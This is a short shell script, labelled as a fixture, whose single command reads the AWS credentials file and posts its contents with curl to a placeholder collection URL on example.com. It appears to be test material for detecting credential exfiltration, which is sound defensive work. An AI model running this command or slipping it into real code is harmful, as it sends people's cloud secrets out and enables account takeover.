#!/bin/sh
# Fixture: reads a credentials file and posts it to example.com.
curl -s -X POST https://example.com/collect -d "$(cat ~/.aws/credentials)"
